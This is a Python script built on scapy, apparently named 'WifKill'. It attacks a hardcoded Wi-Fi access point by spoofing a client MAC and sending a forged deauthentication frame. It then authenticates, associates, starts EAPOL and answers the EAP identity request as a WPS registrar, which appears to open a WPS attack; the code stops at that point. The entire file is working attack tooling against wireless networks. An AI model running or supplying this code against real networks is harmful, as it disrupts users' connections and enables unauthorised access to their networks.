#!/usr/bin/env python3

import sys
import csv
import threading
import subprocess
import signal
import json
import pcapy
import shutil

from scapy.all import *

class WifKill:
    def __init__(self):
        self.target_mac = '1c:61:b4:34:be:8e'
        self.sta_mac = '20:32:33:e4:3d:d8'
        self.channel = 11
        self.interface = 'radio0mon'
        self.seq_num = 1
        self.interrupt_flag = 0

        self.beacon_flag = False
        self.send_deauth_auth_flag = False
        self.recv_ssid = ''
        self.recv_auth_flag = False
        self.assoc_resp_flag = False
        self.recv_request_identity = False

        self.rt = RadioTap(present="TXFlags", TXFlags=0x0018)
        self.pcap = pcapy.open_live(self.interface, 100, 1, 9)

        print(f'[+] Switching {self.interface} to channel {self.channel}')
        self.switch_iface_channel(self.interface, self.channel)
        print(f'[+] Waiting beacon frame from {self.target_mac}')
        
        sniff(iface=self.interface, prn=self.packet_handler, stop_filter=lambda pkt: (self.interrupt_flag))

    def switch_iface_channel(self, interface, ch):
        subprocess.run(["iwconfig", interface, "channel", str(ch)], capture_output=True, text=True)

    def send_deauth(self):
        #self.seq_num += 1
        deauth_pkt = bytes(self.rt / Dot11(addr1=self.target_mac, addr2=self.sta_mac, addr3=self.target_mac, SC=(self.seq_num << 4)) / Dot11Deauth(reason=3))
        self.pcap.sendpacket(deauth_pkt)
    
    def send_auth(self):
        #self.seq_num += 1
        auth_pkt = bytes(self.rt / Dot11(addr1=self.target_mac, addr2=self.sta_mac, addr3=self.target_mac, SC=(self.seq_num << 4))  / Dot11Auth(seqnum=self.seq_num))
        self.pcap.sendpacket(auth_pkt)

    def send_assoc(self):
        self.seq_num += 1
        vendor_specific = b"\x00\x50\xf2\x04\x10\x4a\x00\x01\x10\x10\x3a\x00\x01\x02"
        supported_rates = b"\x02\x04\x0b\x16\x12\x24\x48\x6c"
        ext_supported_r = b"\x0c\x18\x30\x60"
        ht_capabilities = b"\x0e\x10\x17\xff\xff\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

        pkt = self.rt / \
            Dot11(addr1=self.target_mac, addr2=self.sta_mac, addr3=self.target_mac, SC=(self.seq_num << 4)) / \
            Dot11AssoReq(cap="ESS", listen_interval=0x000a) / \
            Dot11Elt(ID="SSID", info=self.recv_ssid) / \
            Dot11Elt(ID=1, info=supported_rates) / \
            Dot11Elt(ID=50, info=ext_supported_r) / \
            Dot11Elt(ID=45, info=ht_capabilities) / \
            Dot11Elt(ID=221, info=vendor_specific)
        pkt_raw = bytes(pkt)
        self.pcap.sendpacket(pkt_raw)

    def send_eapol_start(self):
        self.seq_num += 1

        dot11 = Dot11(type=2, subtype=0, FCfield = 0x01, addr1=self.target_mac, addr2=self.sta_mac, addr3=self.target_mac, SC=(self.seq_num << 4))
        dot11.duration = 0x003C

        pkt = self.rt / \
            dot11 / \
            LLC() / SNAP(OUI=0x000000, code=0x888E) / \
            EAPOL(version=1, type=1)
        pkt_raw = bytes(pkt)
        self.pcap.sendpacket(pkt_raw)

    def send_eap_dentity_response(self, id):
        self.seq_num += 1
        pkt = self.rt / \
            Dot11(addr1=self.target_mac, FCfield=0x01, addr2=self.sta_mac, addr3=self.target_mac, SC=(self.seq_num << 4)) / \
            LLC() / SNAP(OUI=0x000000, code=0x888E) / \
            EAPOL(version=1, type=0) / \
            EAP(code=2, id=id, type=1, identity="WFA-SimpleConfig-Registrar-1-0")
        pkt_raw = bytes(pkt)
        for i in range(10):
            self.pcap.sendpacket(pkt_raw)       

    def packet_handler(self, pkt):
        if not self.beacon_flag:
            if pkt.type == 0 and pkt.subtype == 8 and pkt.addr3 == self.target_mac:
                self.beacon_flag = True
                elem = pkt.getlayer(Dot11Elt)
                while elem:
                    if elem.ID == 0:
                        self.recv_ssid = elem.info.decode(errors="ignore")
                        print(f'[+] Received beacon frame from {self.target_mac}')
                        print('[+] Sending authentication request')
                        break
                elem = elem.payload

        if not self.recv_auth_flag and self.beacon_flag:
            if not self.send_deauth_auth_flag:
                print('[+] Send deauth')
                self.send_deauth()
                self.send_auth()
                self.send_deauth_auth_flag = True

            if pkt.type == 0 and pkt.subtype == 11 and pkt.addr2 == self.target_mac and pkt.addr3 == self.target_mac:
                self.recv_auth_flag = True
                print('[+] Received authentication respone')
                print('[+] Send association request')
                self.send_assoc()

        if not self.assoc_resp_flag:
            if pkt.type == 0 and pkt.subtype == 1 and pkt.addr2 == self.target_mac and pkt.addr3 == self.target_mac:
                self.assoc_resp_flag = True
                print(f'[+] Associated with {self.target_mac} (ESSID: {self.recv_ssid})')
                print('[+] Sending EAPOL START request')
                self.send_eapol_start()
        if not self.recv_request_identity:
            if pkt.type == 2 and pkt.subtype == 0 and pkt.addr2 == self.target_mac and pkt.addr3 == self.target_mac:
                if pkt.haslayer(EAP):
                    self.recv_request_identity = True
                    print('[+] Received Request, Indetity')
                    print('[+] Sending identity response')
                    self.send_eap_dentity_response(pkt[EAP].id)


wifkill = WifKill()